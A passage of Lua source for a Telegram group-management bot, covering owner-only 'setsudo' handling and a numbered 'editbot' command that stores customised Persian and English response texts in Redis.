    if (matches[1]:lower() == "setsudo" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\179\217\136\216\175\217\136") and is_botOwner(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply2, {
          chat_id = msg.to.id,
          cmd = "setsudo"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "GetUser",
          user_id_ = matches[2]
        }, action_by_id2, {
          chat_id = msg.to.id,
          user_id = matches[2],
          cmd = "setsudo"
        })
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username2, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "setsudo"
        })
      end
    end
    if (matches[1]:lower() == "editbot" or matches[1] == "\217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "editbot") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        SettingsStrings = [[
`LINK`
`TAG`
`MENTION`
`ARABIC`
`EDIT`
`SPAM`
`FLOOD`
`BOTS`
`MARKDOWN`
`WEBPAGE`
`PIN`
`MAXWORDS`
`CMDS`
`ALL`
`GIF`
`TEXT`
`PHOTO`
`VIDEO`
`AUDIO`
`VOICE`
`STICKER`
`CONTACT`
`FORWARD`
`LOCATION`
`DOCUMENT`
`TGSERVICE`
`INLINE`
`GAME`
`KEYBOARD`
`LANG`
`NUMBEROFFLOOD`
`NUMBEROFMAXWORDS`
`NUMBEROFMAXWARN`
`NUMBEROFFORCEDINVITE`
`EXPIRE`
`SENSE`
`WELCOME`
`BOTCHAT`
`FLOODTIME`
`FOHSH`
`ENGLISH`
`FORCEDINVITE`
`USERNAME`
`JOIN`
`NOTE`]]
        if matches[2]:lower() == "all" and matches[3]:lower() == "help" then
          return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\136\219\140\216\177\216\167\219\140\216\180 \217\133\216\170\217\134 \217\135\216\167\219\140 \217\190\219\140\216\180\217\129\216\177\216\182:\n/editbot `NUMBER` `TEXT`\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\168\217\135 \216\172\216\167\219\140 TEXT \216\167\216\178 help \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \216\170\216\167 \216\177\216\167\217\135\217\134\217\133\216\167\219\140 \217\135\216\177 \216\168\216\174\216\180 \216\177\216\167 \217\133\216\180\216\167\217\135\216\175\217\135 \218\169\217\134\219\140\216\175\n\216\185\216\175\216\175 \217\135\216\167:\n*1-*`\217\130\217\129\217\132 \216\180\216\175` (EN)\n*2-*`\217\130\217\129\217\132 \216\180\216\175` (FA)\n*3-*`\216\167\216\177\217\136\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\167\216\185\216\182\216\167 \217\133\216\185\217\133\217\136\217\132\219\140` (EN)\n*4-*`\216\167\216\177\217\136\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\167\216\185\216\182\216\167 \217\133\216\185\217\133\217\136\217\132\219\140` (FA)\n*5-*`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\179\217\136\216\175\217\136` (\226\157\147)\n*6-*`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135` (EN)\n*7-*`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135` (FA)\n*8-*`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135` (EN)\n*9-*`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135` (FA)\n*10-*`\216\167\216\177\217\136\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136` (EN)\n*11-*`\216\167\216\177\217\136\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136` (FA)\n*12-*`\217\133\216\170\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170` (EN)\n*13-*`\217\133\216\170\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170` (FA)\n*14-*`\216\180\218\169\217\132\218\169 \217\130\217\129\217\132 \216\175\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170` (\240\159\148\144)\n*15-*`\216\180\218\169\217\132\218\169 \216\168\216\167\216\178 \216\168\217\136\216\175\217\134 \217\130\217\129\217\132 \216\175\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170` (\240\159\148\147)\n*16-*`\216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\171\216\167\216\168\216\170 \216\168\216\177\216\167\219\140 \217\190\216\167\219\140\219\140\217\134 \217\133\216\170\217\134 \217\135\216\167`\n*17-*`\216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\171\216\167\216\168\216\170 \216\168\216\177\216\167\219\140 \216\168\216\167\217\132\216\167\219\140 \217\133\216\170\217\134 \217\135\216\167`\n*18-*`\216\168\216\167\216\178 \219\140\216\167 \217\130\217\129\217\132 \218\169\216\177\216\175\217\134 \216\162\219\140\216\170\217\133 \217\135\216\167 \216\168\216\167 \216\175\217\136 \216\175\216\179\216\170\217\136\216\177`\n*19-*`\216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \217\133\217\134\216\180\219\140 \216\174\216\181\217\136\216\181\219\140 \216\177\216\168\216\167\216\170`\n*20-*`\216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \217\136\217\130\217\129\217\135 \216\175\216\177 \216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \217\133\217\134\216\180\219\140`\n*21-*`\216\170\217\134\216\184\219\140\217\133 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 \216\170\219\140\217\133 (\216\168\216\167 @ \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175)`\n*22-*`\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140 \216\170\219\140\217\133`\n*23-*`\216\170\216\186\219\140\219\140\216\177 \216\180\218\169\217\132\218\169 \217\190\219\140\216\180\217\129\216\177\216\182 \217\133\216\170\217\134 \216\175\216\179\216\170\217\136\216\177\216\167\216\170` (\226\149\160)\n*24-*`\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\129\216\167\216\177\216\179\219\140 \216\179\217\136\216\175\217\136`\n*25-*`\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\129\216\167\216\177\216\179\219\140 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135`\n*26-*`\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\129\216\167\216\177\216\179\219\140 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135`\n*27-*`\216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \217\136\217\130\217\129\217\135 \216\175\216\177 \216\167\216\185\217\132\216\167\217\134 \216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167\219\140 \216\175\216\185\217\136\216\170 \216\180\216\175\217\135`\n*28-*`\216\180\218\169\217\132\218\169 \217\190\219\140\216\180\217\129\216\177\216\182 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\129\216\167\216\177\216\179\219\140 (\240\159\145\136)`\n*29-*`\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170`\n*30-*`\216\168\216\179\216\170\217\134 \216\175\216\179\216\170\216\177\216\179\219\140 \216\167\216\185\216\182\216\167 \217\133\216\185\217\133\217\136\217\132\219\140 \216\168\217\135 \216\177\216\168\216\167\216\170`\n*31-*`\216\167\216\177\216\170\217\130\216\167 \216\174\217\136\216\175\218\169\216\167\216\177 \217\135\217\134\218\175\216\167\217\133 \217\134\216\181\216\168 \218\175\216\177\217\136\217\135`"
        elseif matches[2]:match("(%d+)") then
          if matches[2] == "1" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 1: \216\180\217\133\216\167 \216\168\216\167\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`NAME` \217\134\216\167\217\133 \217\130\217\129\217\132 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`STATUS` \217\136\216\182\216\185\219\140\216\170 \217\130\217\129\217\132 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3]:match("NAME") and matches[3]:match("STATUS") then
              print(matches[3])
              redis:set("EditBot:locktextEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:locktextEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            elseif not matches[3]:match("NAME") or not matches[3]:match("STATUS") then
              return "\217\132\216\183\217\129\216\167 \216\167\216\178 \218\169\217\132\217\133\216\167\216\170 NAME \217\136 STATUS \216\175\216\177 \217\133\216\170\217\134 \216\174\217\136\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175!"
            end
          elseif matches[2] == "2" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 2: \216\180\217\133\216\167 \216\168\216\167\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`NAME` \217\134\216\167\217\133 \217\130\217\129\217\132 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`STATUS` \217\136\216\182\216\185\219\140\216\170 \217\130\217\129\217\132 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3]:match("NAME") and matches[3]:match("STATUS") then
              redis:set("EditBot:locktextFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:locktextFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            elseif not matches[3]:match("NAME") or not matches[3]:match("STATUS") then
              return "\217\132\216\183\217\129\216\167 \216\167\216\178 \218\169\217\132\217\133\216\167\216\170 NAME \217\136 STATUS \216\175\216\177 \217\133\216\170\217\134 \216\174\217\136\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175!"
            end
          elseif matches[2] == "3" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 3: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`USERID` \216\162\219\140\216\175\219\140 \216\185\216\175\216\175\219\140 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`GPID` \216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`USERNAME` \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:accessEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:accessEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "4" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 4: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`USERID` \216\162\219\140\216\175\219\140 \216\185\216\175\216\175\219\140 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`GPID` \216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`USERNAME` \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:accessFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:accessFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "5" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:helpsudo")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:helpsudo", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "6" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:helpownerEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:helpownerEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "7" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:helpownerFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:helpownerFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "8" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:helpmodEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:helpmodEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "9" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:helpmodFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:helpmodFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "10" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 10: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`USERID` \216\162\219\140\216\175\219\140 \216\185\216\175\216\175\219\140 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`GPID` \216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`USERNAME` \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:errorsudoaccessEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:errorsudoaccessEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "11" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 11: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n`USERID` \216\162\219\140\216\175\219\140 \216\185\216\175\216\175\219\140 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`GPID` \216\162\219\140\216\175\219\140 \218\175\216\177\217\136\217\135 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175\n`USERNAME` \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \218\169\216\167\216\177\216\168\216\177 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\162\217\134 \217\133\219\140\216\180\217\136\216\175"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:errorsudoaccessFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:errorsudoaccessFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "12" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 12: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n" .. SettingsStrings
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:settingsEN")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:settingsEN", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "13" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 13: \216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\167\219\140\217\134 \217\133\217\136\216\167\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n" .. SettingsStrings
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:settingsFA")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:settingsFA", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "14" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:lockemoji")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:lockemoji", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "15" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:unlockemoji")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:unlockemoji", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "16" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:textmessages")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:textmessages", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "17" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3] == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:uptextmessages")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:uptextmessages", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "18" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 18:\n\216\168\216\177\216\167\219\140 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \216\167\219\140\217\134 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\216\178 \218\169\217\132\217\133\217\135 `on` \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n\217\136 \216\168\216\177\216\167\219\140 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\219\140\217\134 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\216\178 \218\169\217\132\217\133\217\135 `off` \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3] == "on" or matches[3] == "\216\177\217\136\216\180\217\134" then
              redis:set("EditBot:lockandunlock", true)
              return "\216\177\217\136\216\180\217\134 \216\180\216\175"
            elseif matches[3] == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("EditBot:lockandunlock")
